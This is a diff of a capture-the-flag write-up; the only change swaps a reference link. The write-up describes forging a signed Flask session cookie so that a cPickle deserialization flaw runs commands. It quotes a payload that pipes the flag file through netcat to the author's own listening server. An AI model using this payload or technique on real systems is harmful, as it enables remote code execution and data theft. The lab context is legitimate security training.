@@ -24,7 +24,7 @@ Here the source variable is the string of the .py file which can be seen [here.]
 
 By inspecting this file first we spot the cPickle. The script reads the `sesion['auth']` from cookie(encrypted but we have the key at the bottom of the code) and loads it. So now we can use pickle exploit. For signing the pickle I run my own server using flask and the same key and copied the crafted cookie.
 
-At first I tried to do `system('cat ../flagdir/flag 2>&1 | nc ip_of_my_server 10101')` and opened the server using `nc -lvp 10101` but I got permission denied error. The file was owned by `root` however we are `post`. So I used another method that can be found [here.](https://www.cs.uic.edu/~s/musings/pickle.html).
+At first I tried to do `system('cat ../flagdir/flag 2>&1 | nc ip_of_my_server 10101')` and opened the server using `nc -lvp 10101` but I got permission denied error. The file was owned by `root` however we are `post`. So I used another method that can be found [here.](https://www.cs.uic.edu/~s/musings/pickle/).
 
 ```python
 def foo():
